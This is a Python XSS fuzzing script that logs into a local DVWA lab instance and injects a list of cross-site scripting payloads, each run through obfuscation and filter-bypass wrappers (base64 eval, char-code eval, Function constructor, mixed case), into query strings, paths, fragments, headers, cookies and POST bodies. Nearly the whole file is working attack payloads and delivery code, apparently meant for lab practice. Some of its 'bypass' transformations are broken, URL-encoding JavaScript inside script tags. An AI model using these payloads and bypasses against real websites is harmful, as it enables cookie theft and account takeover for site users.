import requests
from bs4 import BeautifulSoup
import urllib.parse
import urllib3
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================
#               CONFIG
# ============================================
DVWA_URL = "http://127.0.0.1/DVWA"
USERNAME = "admin"
PASSWORD = "password"

XSS_R_URL = f"{DVWA_URL}/vulnerabilities/xss_r/"

# ============================================
#       ADVANCED XSS PAYLOADS LIST
# ============================================
xss_payloads = [
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg/onload=fetch('/evil')>",
    "';fetch('/evil')//",
    "\"><script>fetch('/evil')</script>",
    "<marquee onstart=fetch('/evil')>",
    "<body onload=fetch('/evil')>",
    "<details open ontoggle=fetch('/evil')>",
    "<iframe src=javascript:fetch('/evil')>",
    "<input type=text value='' onfocus=fetch('/evil') autofocus>",
    "<a href=javascript:fetch('/evil')>Click Me</a>",
    "<object data=javascript:fetch('/evil')>",
    "<embed src=javascript:fetch('/evil')>",
    "<form><button formaction=javascript:fetch('/evil')>Click</button></form>",
    "<meta http-equiv='refresh' content='0;url=javascript:fetch(\"/evil\")'>",
    "<table background=javascript:fetch('/evil')>",
    "<link rel=stylesheet href='javascript:fetch(\"/evil\")'>",
    "<script>document.write('<img src=x onerror=fetch(\"/evil\")>')</script>",
    "<video><source onerror=fetch('/evil')>",
    "<style>@import'javascript:fetch(\"/evil\")';</style>"
]

# ============================================
#        TRANSFORMATION FUNCTIONS
# ============================================

def transform_double_encoding(payload):
    """ Double encode the payload """
    return urllib.parse.quote(urllib.parse.quote(payload))

def transform_js_protocol(payload):
    """ Wrap payload in a JavaScript protocol for attribute injection """
    return f"javascript:{payload}"

def transform_script_context(payload):
    """ Escape out of script context """
    return f"';{payload}//"

def transform_attribute_escape(payload):
    """ Escape attribute values for input field injections """
    return f"\" autofocus onfocus={payload} \""

def transform_event_bypass(payload):
    """ Inject payload into an alternate event handler """
    return f"<img src=x onerror={payload}>"

def transform_csp_bypass(payload):
    """ Modify payload to evade CSP using SVG """
    return f"<svg/onload={payload}>"

def transform_http_pollution(payload):
    """ Attempt HTTP parameter pollution """
    return f"?param={payload}&param=test"

def transform_html_entities(payload):
    """Encodes XSS payload with HTML entities."""
    return ''.join(f'&#{ord(c)};' for c in payload)

def transform_settimeout(payload):
    """Delays execution using setTimeout."""
    return f"setTimeout(function(){{ {payload} }}, 100);"

def transform_iframe(payload):
    """Injects payload using an iframe."""
    return f"<iframe src=javascript:{payload}></iframe>"

def transform_meta_redirect(payload):
    """Injects a JavaScript payload into a meta refresh."""
    return f"<meta http-equiv='refresh' content='0;url=javascript:{payload}'>"

def transform_webassembly_bypass(payload):
    """Execute XSS payload using WebAssembly, properly formatted for headers."""
    
    # Minified WebAssembly Payload (no newlines)
    js_payload = """
    WebAssembly.instantiateStreaming(fetch('data:application/wasm;base64,AGFzbQEAAAABBgFgAX8AYAF/AGAAAX8DAgEABQNlbnYAAwAADgEDZW52AAAACQNlbnYAbWVtAQABBg=='))
    .then(obj => alert(document.domain));
    """
    
    # Remove newlines & extra spaces
    minified_payload = "".join(js_payload.split())

    # Encode for safe usage in headers
    encoded_payload = urllib.parse.quote(minified_payload)

    # Return a fully escaped payload
    return f"<script>{encoded_payload}</script>"

def transform_css_expression(payload):
    """Inject XSS via CSS expression() (Works in older IE versions)"""
    return f"""<style>*{{background:url("javascript:{payload}")}}</style>"""

def transform_mutation_observer(payload):
    """Execute XSS using MutationObserver, properly encoded for headers"""
    
    # Minified MutationObserver payload
    js_payload = f'new MutationObserver(()=>{{eval("{payload}")}}).observe(document,{{childList:true,subtree:true}});'

    # Encode the payload for safe usage in headers
    encoded_payload = urllib.parse.quote(js_payload)

    # Return a fully escaped script
    return f"<script>{encoded_payload}</script>"

def transform_fetch_xss(payload):
    """Execute XSS by fetching a remote JavaScript payload"""
    return f"""<script>fetch('data:text/javascript,{urllib.parse.quote(payload)}').then(r=>r.text()).then(eval);</script>"""

import urllib.parse

def transform_shadow_dom_xss(payload):
    """Inject XSS payload inside a Shadow DOM with proper encoding"""
    
    # Minified & Escaped Shadow DOM Payload
    js_payload = f"""let shadow=document.getElementById('evil').attachShadow({{mode:'open'}});
    shadow.innerHTML=`<img src=x onerror="{payload}">`;"""

    # Encode for safe injection in headers
    encoded_payload = urllib.parse.quote(js_payload)

    # Return a fully escaped script
    return f"<script>{encoded_payload}</script>"

# List of transformation functions
transformation_methods = [
    transform_double_encoding,
    transform_js_protocol,
    transform_script_context,
    transform_attribute_escape,
    transform_event_bypass,
    transform_csp_bypass,
    transform_http_pollution,
    transform_settimeout,
    transform_iframe,
    transform_meta_redirect,
    transform_webassembly_bypass,
    transform_css_expression,
    transform_mutation_observer,
    transform_fetch_xss,
    transform_shadow_dom_xss
]

# ============================================
#        OBFUSCATION FUNCTIONS
# ============================================

def obfuscate_hex(payload):
    return "".join(f"&#x{ord(c):x};" for c in payload)

def obfuscate_base64(payload):
    return f"<script>eval(atob('{base64.b64encode(payload.encode()).decode()}'))</script>"

def obfuscate_event_handler(payload):
    return f"<img src=x onerror=\"eval(atob('{base64.b64encode(payload.encode()).decode()}'))\">"

def obfuscate_unicode(payload):
    return "".join(f"\\u{ord(c):04x}" for c in payload)

def obfuscate_string_split(payload):
    return f"<script>eval({'+'.join([repr(c) for c in payload])})</script>"

def obfuscate_function_constructor(payload):
    return f"<script>new Function({repr(payload)})()</script>"

def obfuscate_settimeout(payload):
    return f"<script>setTimeout({repr(payload)}, 100)</script>"

def obfuscate_location_hash(payload):
    return f"<script>window.location.hash=eval({repr(payload)})</script>"

def obfuscate_mixed_case(payload):
    return payload.replace("script", "ScRiPt")

def obfuscate_comment_break(payload):
    return f"<script>/*XSS*/{payload}//</script>"

def obfuscate_dynamic_eval(payload):
    return f"<script>eval(String.fromCharCode({','.join(str(ord(c)) for c in payload)}))</script>"

# List of obfuscation functions
obfuscation_methods = [
    obfuscate_hex,
    obfuscate_base64,
    obfuscate_event_handler,
    obfuscate_unicode,
    obfuscate_string_split,
    obfuscate_function_constructor,
    obfuscate_settimeout,
    obfuscate_location_hash,
    obfuscate_mixed_case,
    obfuscate_comment_break
]

# ============================================
#        HELPER / SETUP FUNCTIONS
# ============================================

def setup_database(session):
    print("[*] Setting up DVWA database...")
    session.get(f"{DVWA_URL}/setup.php")
    session.post(f"{DVWA_URL}/setup.php", data={"create_db": "Create / Reset Database"})

def login_dvwa(session, username, password):
    print("[*] Logging into DVWA...")
    login_page = session.get(f"{DVWA_URL}/login.php")
    soup = BeautifulSoup(login_page.text, "html.parser")
    csrf_token = soup.find("input", {"name": "user_token"}).get("value", "")

    login_data = {"username": username, "password": password, "Login": "Login", "user_token": csrf_token}
    response = session.post(f"{DVWA_URL}/login.php", data=login_data)

    return "Welcome" in response.text

def set_security_level(session, level="impossible"):
    print(f"[*] Setting DVWA security level to {level}...")
    security_page = session.get(f"{DVWA_URL}/security.php")
    soup = BeautifulSoup(security_page.text, "html.parser")
    csrf_token = soup.find("input", {"name": "user_token"}).get("value", "")

    session.post(f"{DVWA_URL}/security.php", data={"security": level, "seclev_submit": "Submit", "user_token": csrf_token})

# ============================================
#        XSS TESTING FUNCTIONS
# ============================================

def test_xss(session, url, param_name="name"):
    print(f"\n[+] Testing Reflected XSS on: {url} with param '{param_name}'")

    successful_payloads = []

    for payload in xss_payloads:
        for obfuscation in obfuscation_methods:
            obfuscated_payload = obfuscation(payload)
            print(f"\n[*] Testing Payload: {obfuscated_payload}")

            # Query Parameter Delivery
            params = {param_name: obfuscated_payload}
            test_url = f"{url}?{urllib.parse.urlencode(params)}"
            print(f"[~] Testing Query Parameter Injection: {test_url}")
            response = session.get(test_url, verify=False)
            if obfuscated_payload in response.text:
                print(f"[+] Payload reflected via QUERY: {test_url}")
                successful_payloads.append(("QUERY", test_url))

            # Path Injection
            test_url = f"{url}/{urllib.parse.quote(obfuscated_payload)}"
            print(f"[~] Testing Path Injection: {test_url}")
            response = session.get(test_url, verify=False)
            if obfuscated_payload in response.text:
                print(f"[+] Payload reflected via PATH: {test_url}")
                successful_payloads.append(("PATH", test_url))

            # Fragment Injection
            test_url = f"{url}#{urllib.parse.quote(obfuscated_payload)}"
            print(f"[~] Testing Fragment Injection: {test_url}")
            response = session.get(test_url, verify=False)
            if obfuscated_payload in response.text:
                print(f"[+] Payload reflected via FRAGMENT: {test_url}")
                successful_payloads.append(("FRAGMENT", test_url))

            # Header Injection
            headers = {
                "User-Agent": obfuscated_payload,
                "Referer": obfuscated_payload,
                "X-Forwarded-For": obfuscated_payload
            }
            print(f"[~] Testing Header Injection with headers: {headers}")
            response = session.get(url, headers=headers, verify=False)
            if obfuscated_payload in response.text:
                print(f"[+] Payload reflected via HEADERS: {headers}")
                successful_payloads.append(("HEADERS", headers))

            # Cookie Injection
            print(f"[~] Testing Cookie Injection: XSS-Test={obfuscated_payload}")
            session.cookies.set("XSS-Test", obfuscated_payload, domain="127.0.0.1")
            response = session.get(url, verify=False)
            if obfuscated_payload in response.text:
                print(f"[+] Payload reflected via COOKIE: {obfuscated_payload}")
                successful_payloads.append(("COOKIE", obfuscated_payload))

            # POST Body Injection
            post_data = {param_name: obfuscated_payload}
            print(f"[~] Testing POST Body Injection: {post_data}")
            response = session.post(url, data=post_data, verify=False)
            if obfuscated_payload in response.text:
                print(f"[+] Payload reflected via POST: {post_data}")
                successful_payloads.append(("POST", post_data))

    # Display results
    if successful_payloads:
        print("\n[+] Successful XSS payloads detected:")
        for method, payload in successful_payloads:
            print(f"  - [{method}] {payload}")
    else:
        print("\n[-] No successful XSS payloads found.")

# ============================================
#                MAIN
# ============================================
if __name__ == "__main__":
    session = requests.Session()
    setup_database(session)

    if not login_dvwa(session, USERNAME, PASSWORD):
        print("[-] Exiting due to login failure.")
        exit(1)

    set_security_level(session, "impossible")

    test_xss(session, XSS_R_URL, param_name="name")

    print("\n[*] Finished XSS testing on DVWA.")